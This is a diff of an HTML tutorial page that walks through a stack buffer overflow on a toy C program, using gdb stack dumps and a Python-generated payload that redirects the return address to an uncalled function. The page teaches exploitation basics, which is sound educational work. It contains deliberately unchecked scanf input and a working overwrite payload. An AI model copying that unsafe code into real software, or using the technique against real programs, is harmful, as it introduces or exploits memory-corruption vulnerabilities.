@@ -467,7 +467,8 @@ void unrelated(){
 void enterString(){
     char buffer[2];
     printf("Enter two characters:\n");
-    scanf("%s", buffer); 
+    scanf("%s", buffer);
+    printf("%s\n", buffer);               
 }
 
 int main(){
@@ -476,8 +477,240 @@ int main(){
 </pre>
 <p>
     It is not doing anything usefull. It asks for two characters, write them into a buffer array
-    and then do noting with it. There is also a function that is not called. For simplicity sake
+    and then print it. There is also a function that is not called. For simplicity sake
     we will exploit the buffer overflow to call that function. Another thing that can also be done
-    is writing a function to be called on the stack itself. This would require a little more work
-    and  
+    is writing a function to be called on the stack itself. This would require a little more work.
+</p>
+<p>
+    Because on our experiment we will not execute the stack, the flag -z execstack is optional. 
+    I will keep it just in case you want to try doing it on your own.
+</p>
+<p>Save it as buff.c and compile it with:</p>
+<pre>
+gcc -no-pie -fno-stack-protector -z execstack buff.c -o buff
+</pre>
+<p><a href="https://stackoverflow.com/questions/47778099/what-is-no-pie-used-for">no-pie</a></p>
+<p><a href="https://stackoverflow.com/questions/29178445/what-is-the-z-option-for-in-this-gcc-compiler-command">z execstack</a></p>
+<p>Then run it:</p>
+<pre>
+./buff 
+Enter two characters:
+ab
+ab
+</pre>
+<p>And now we run it with gdb. The value on the ascii table for a is 0x61 (hexadecimal) and for b is 0x62.</p>
+<pre>
+gdb buff
+(gdb) start
+Temporary breakpoint 1 at 0x4011b4
+Starting program: /home/carol/dev/backToBasics/understandingTheStack/bufferExploit/buff 
+
+Temporary breakpoint 1, 0x00000000004011b4 in main ()
+(gdb) disas
+Dump of assembler code for function main:
+   0x00000000004011ac <+0>:	endbr64 
+   0x00000000004011b0 <+4>:	push   %rbp
+   0x00000000004011b1 <+5>:	mov    %rsp,%rbp
+=> 0x00000000004011b4 <+8>:	mov    $0x0,%eax
+   0x00000000004011b9 <+13>:	call   0x40116d <enterString>
+   0x00000000004011be <+18>:	mov    $0x0,%eax
+   0x00000000004011c3 <+23>:	pop    %rbp
+   0x00000000004011c4 <+24>:	ret    
+End of assembler dump.
+(gdb) si
+0x00000000004011b9 in main ()
+(gdb) si
+0x000000000040116d in enterString ()
+(gdb) disas
+Dump of assembler code for function enterString:
+=> 0x000000000040116d <+0>:	endbr64 
+   0x0000000000401171 <+4>:	push   %rbp
+   0x0000000000401172 <+5>:	mov    %rsp,%rbp
+   0x0000000000401175 <+8>:	sub    $0x10,%rsp
+   0x0000000000401179 <+12>:	lea    0xe9e(%rip),%rdi        # 0x40201e
+   0x0000000000401180 <+19>:	call   0x401050 <puts@plt>
+   0x0000000000401185 <+24>:	lea    -0x2(%rbp),%rax
+   0x0000000000401189 <+28>:	mov    %rax,%rsi
+   0x000000000040118c <+31>:	lea    0xea1(%rip),%rdi        # 0x402034
+   0x0000000000401193 <+38>:	mov    $0x0,%eax
+   0x0000000000401198 <+43>:	call   0x401060 <__isoc99_scanf@plt>
+   0x000000000040119d <+48>:	lea    -0x2(%rbp),%rax
+   0x00000000004011a1 <+52>:	mov    %rax,%rdi
+   0x00000000004011a4 <+55>:	call   0x401050 <puts@plt>
+   0x00000000004011a9 <+60>:	nop
+   0x00000000004011aa <+61>:	leave  
+   0x00000000004011ab <+62>:	ret    
+End of assembler dump.
+(gdb) break * enterString+43
+Breakpoint 2 at 0x401198
+(gdb) continue
+Continuing.
+Enter two characters:
+
+Breakpoint 2, 0x0000000000401198 in enterString ()
+</pre>
+<p>Before continuing, let's look at the stack. Since we don't really care about the Base Pointer,
+    we print the first 32 bytes from the stack.
+</p>
+<pre>
+(gdb) ni
+ab
+0x000000000040119d in enterString ()
+(gdb) x/32x $rsp
+0x7fffffffdeb0:	0x00000000	0x00000000	0x00401070	0x62610000
+0x7fffffffdec0:	0xffffde00	0x00007fff	0x004011be	0x00000000
+0x7fffffffded0:	0x00000000	0x00000000	0xf7dec565	0x00007fff
+0x7fffffffdee0:	0xffffdfc8	0x00007fff	0xf7fc7000	0x00000001
+0x7fffffffdef0:	0x004011ac	0x00000000	0xffffe2d9	0x00007fff
+0x7fffffffdf00:	0x004011d0	0x00000000	0xc54d1eb6	0x02450e1b
+0x7fffffffdf10:	0x00401070	0x00000000	0x00000000	0x00000000
+0x7fffffffdf20:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) 
+</pre>
+<p>This is stack we see for a well behaved input.</p>
+<p>See that inside the stack at 0x7fffffffdec0 we have 0x004011be 0x00000000,
+     the address on main() for the Instruction Pointer to return to.
+</p>
+<p>What happens if we type the whole alphabet as the input?</p>
+<pre>
+(gdb) start
+(gdb) start
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Temporary breakpoint 3 at 0x4011b4
+Starting program: /home/carol/dev/backToBasics/understandingTheStack/bufferExploit/buff 
+
+Temporary breakpoint 3, 0x00000000004011b4 in main ()
+(gdb) break * enterString+43
+Note: breakpoint 2 also set at pc 0x401198.
+Breakpoint 4 at 0x401198
+(gdb) continue
+Continuing.
+Enter two characters:
+
+Breakpoint 2, 0x0000000000401198 in enterString ()
+(gdb) ni
+abcdefghijklmnopqrstuvwxyz
+0x000000000040119d in enterString ()
+(gdb) x/32x $rsp
+0x7fffffffdeb0:	0x00000000	0x00000000	0x00401070	0x62610000
+0x7fffffffdec0:	0x66656463	0x6a696867	0x6e6d6c6b	0x7271706f
+0x7fffffffded0:	0x76757473	0x7a797877	0xf7dec500	0x00007fff
+0x7fffffffdee0:	0xffffdfc8	0x00007fff	0xf7fc7000	0x00000001
+0x7fffffffdef0:	0x004011ac	0x00000000	0xffffe2d9	0x00007fff
+0x7fffffffdf00:	0x004011d0	0x00000000	0x129d1190	0x4120e741
+0x7fffffffdf10:	0x00401070	0x00000000	0x00000000	0x00000000
+0x7fffffffdf20:	0x00000000	0x00000000	0x00000000	0x00000000
+</pre>
+<p>If you look again at 0x7fffffffdec0 you will see 0x66656463 0x6a696867 0x6e6d6c6b 0x7271706f 
+    where the return address used to be.</p>
+<p>
+    And looking at an <a href="https://www.rapidtables.com/code/text/ascii-table.html">ASCII table</a>
+    you will find out that 0x66656463 0x6a696867 0x6e6d6c6b 0x7271706f is the value for fedc jihg nmlk rqpo
+</p>
+<p>What is happening is that scanf is not doing any check so as long we keep giving an input, 
+    scanf will keep writing it to the stack, eventually overriding other values. The inpjt is little-endian.
+</p>
+<p>Now, we know we need to replace nmlk rqpo on our input with the address for our unrelated function and 
+    keep the Base Pointer at fedc jihg.</p>
+<p>Let's find the address for the unrelated function first:</p>
+<pre>
+(gdb) disas unrelated
+Dump of assembler code for function unrelated:
+    0x0000000000401156 <+0>:	endbr64 
+    0x000000000040115a <+4>:	push   %rbp
+    0x000000000040115b <+5>:	mov    %rsp,%rbp
+    0x000000000040115e <+8>:	lea    0xe9f(%rip),%rdi        # 0x402004
+    0x0000000000401165 <+15>:	call   0x401050 <puts@plt>
+    0x000000000040116a <+20>:	nop
+    0x000000000040116b <+21>:	pop    %rbp
+    0x000000000040116c <+22>:	ret    
+End of assembler dump.    
+</pre>
+<p>0x0000000000401156, so rqpo needs to be 0000 and nmlk to be 0x00401156.</p>
+<p>And fedc jihg needs to be 0xffffde00 0x00007fff. Meaning:</p>
+<ul>
+    <li>c -> \x00</li>
+    <li>d -> \xde</li>
+    <li>e -> \xff</li>
+    <li>f -> \xff</li>
+    <li>g -> \xff</li>
+    <li>h -> \x7f</li>
+    <li>i -> \x00</li>
+    <li>j -> \x00</li>
+    <li>k -> \x56</li>
+    <li>l -> \x11</li>
+    <li>m -> \x40</li>
+    <li>n -> \x00</li>
+    <li>o -> \x00</li>
+    <li>p -> \x00</li>
+    <li>q -> \x00</li>
+    <li>r -> \x00</li>
+</ul>
+<p>We can generate this input to a file and pass it to gdb with python 2.</p>
+<pre>
+python -c 'print("ab" + "\x00\xde\xff\xff\xff\x7f\x00\x00\x56\x11\x40\x00\x00\x00\x00\x00")' > rewrite
+</pre>
+<pre>
+gdb buff
+(gdb) disas enterString
+Dump of assembler code for function enterString:
+    0x000000000040116d <+0>:	endbr64 
+    0x0000000000401171 <+4>:	push   %rbp
+    0x0000000000401172 <+5>:	mov    %rsp,%rbp
+    0x0000000000401175 <+8>:	sub    $0x10,%rsp
+    0x0000000000401179 <+12>:	lea    0xe9e(%rip),%rdi        # 0x40201e
+    0x0000000000401180 <+19>:	call   0x401050 <puts@plt>
+    0x0000000000401185 <+24>:	lea    -0x2(%rbp),%rax
+    0x0000000000401189 <+28>:	mov    %rax,%rsi
+    0x000000000040118c <+31>:	lea    0xea1(%rip),%rdi        # 0x402034
+    0x0000000000401193 <+38>:	mov    $0x0,%eax
+    0x0000000000401198 <+43>:	call   0x401060 <__isoc99_scanf@plt>
+    0x000000000040119d <+48>:	lea    -0x2(%rbp),%rax
+    0x00000000004011a1 <+52>:	mov    %rax,%rdi
+    0x00000000004011a4 <+55>:	call   0x401050 <puts@plt>
+    0x00000000004011a9 <+60>:	nop
+    0x00000000004011aa <+61>:	leave  
+    0x00000000004011ab <+62>:	ret    
+End of assembler dump.
+(gdb) break * enterString+48
+(gdb) run < rewrite
+Starting program: /home/carol/dev/backToBasics/understandingTheStack/bufferExploit/buff < rewrite
+Enter two characters:
+
+Breakpoint 1, 0x000000000040119d in enterString ()
+(gdb) x/32x $rsp
+0x7fffffffdeb0:	0x00000000	0x00000000	0x00401070	0x62610000
+0x7fffffffdec0:	0xffffde00	0x00007fff	0x00401156	0x00000000
+0x7fffffffded0:	0x00000000	0x00000000	0xf7dec565	0x00007fff
+0x7fffffffdee0:	0xffffdfc8	0x00007fff	0xf7fc7000	0x00000001
+0x7fffffffdef0:	0x004011ac	0x00000000	0xffffe2d9	0x00007fff
+0x7fffffffdf00:	0x004011d0	0x00000000	0xa5639444	0xe0ff1476
+0x7fffffffdf10:	0x00401070	0x00000000	0x00000000	0x00000000
+0x7fffffffdf20:	0x00000000	0x00000000	0x00000000	0x00000000
+(gdb) continue
+Continuing.
+ab
+This should not be called
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0000000000000000 in ?? ()
+</pre>
+<p>Success! With our payload 0x7fffffffdec0 contains the return for the unrelated function. When 
+    we execute the rest of the code, the message "This should not be called" is printed. This works
+    also by calling the executable directly:
+</p>
+<pre>
+./buff < rewrite                                                                            
+Enter two characters:
+ab
+This should not be called
+[1]    167594 segmentation fault (core dumped)  ./buff < rewrite
+</pre>
+<h2>Links:</h2>
+<p>This tutorial follows the instructions from:
+    <ul>
+        <li><a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/">https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/</a></li>
+        <li><a href="https://samsclass.info/127/proj/ED402.htm">https://samsclass.info/127/proj/ED402.htm</a></li>
+    </ul>
 </p>
